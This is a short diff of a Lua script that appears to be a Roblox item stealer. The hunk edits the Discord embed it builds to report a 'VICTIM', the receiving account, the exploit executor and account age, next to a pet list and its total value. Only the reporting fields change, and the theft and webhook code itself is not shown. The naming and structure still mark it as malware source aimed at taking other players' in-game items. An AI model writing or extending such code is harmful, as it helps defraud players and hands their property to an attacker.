@@ -43,12 +43,12 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         fields = {
             {
                 name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    VICTIM.Name, 
-                    table.concat(USERNAMES, " "), 
-                    identifyexecutor(), 
-                    game.Players.LocalPlayer.AccountAge
-                ),
+                value = string.format("```Giver: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+    VICTIM.Name,
+    RECEIVER,
+    EXECUTOR,
+    game.Players.LocalPlayer.AccountAge
+),
                 inline = false
             },
             {
@@ -225,5 +225,6 @@ task.spawn(function()
     end
 
 end)
+
 
 
